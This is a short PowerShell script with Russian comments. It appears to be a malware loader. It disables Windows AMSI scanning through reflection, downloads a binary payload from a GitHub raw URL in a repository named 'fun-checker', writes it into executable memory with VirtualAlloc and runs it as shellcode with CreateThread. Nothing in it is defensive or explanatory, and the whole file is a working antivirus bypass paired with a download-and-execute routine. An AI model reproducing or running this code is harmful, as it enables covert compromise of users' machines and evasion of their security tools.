$ErrorActionPreference = "SilentlyContinue"

# AMSI bypass (новый, для свежих Windows)
$m = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
$t = $m.GetType("System.Management.Automation.AmsiUtils")
$f = $t.GetField("amsiInitFailed", "NonPublic,Static")
$f.SetValue($null, $true)

# Payload URL
$URL = "https://raw.githubusercontent.com/wsxdsd1337-pixel/fun-checker/main/payload.bin"

# Скачиваем
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadData($URL)

# Получаем адреса функций kernel32 через P/Invoke без Add-Type
$k32 = [System.Runtime.InteropServices.Marshal]::GetModuleHandle("kernel32.dll")
$getProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetProcAddress(
        [System.Runtime.InteropServices.Marshal]::GetModuleHandle("kernel32.dll"),
        "GetProcAddress"
    ),
    [Type]([System.IntPtr])
)

function Get-Fn($name) {
    $addr = [System.Runtime.InteropServices.Marshal]::GetProcAddress($k32, $name)
    return $addr
}

# VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
$VirtualAlloc = Get-Fn "VirtualAlloc"
$virtualAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $VirtualAlloc,
    [Type]([Func[IntPtr, UIntPtr, UInt32, UInt32, IntPtr]])
)

$size = [UIntPtr]::new([UInt64]$data.Length)
$addr = $virtualAllocDelegate.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) { exit 1 }

# Копируем shellcode
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $data.Length)

# CreateThread
$CreateThread = Get-Fn "CreateThread"
$createThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $CreateThread,
    [Type]([Func[IntPtr, UIntPtr, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
)

$h = $createThreadDelegate.Invoke([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($h -eq [IntPtr]::Zero) { exit 1 }

$WaitForSingleObject = Get-Fn "WaitForSingleObject"
$waitDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $WaitForSingleObject,
    [Type]([Func[IntPtr, UInt32, UInt32]])
)
$waitDelegate.Invoke($h, 0xFFFFFFFF) | Out-Null